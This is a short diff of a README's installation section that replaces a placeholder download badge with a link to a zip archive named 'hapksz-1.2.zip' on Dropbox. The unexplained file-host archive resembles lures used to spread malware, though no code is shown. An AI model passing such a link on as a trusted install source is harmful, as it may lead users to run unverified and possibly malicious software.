@@ -27,9 +27,9 @@ The tool locates the source file, invokes the appropriate compiler, and generate
 
 ## Installation
 
-### Versions
+### Version v1
 
-[![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://your-download-link.com)
+ Version 1.2 [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/gl94ujyvlg0qywtc9sld5/hapksz-1.2.zip?rlkey=p1ngb90mhrhhvn3pt2gr94ihv&st=cw81l2aa&dl=1)
 
 
 Make sure you have Node.js installed (version 14 or higher).
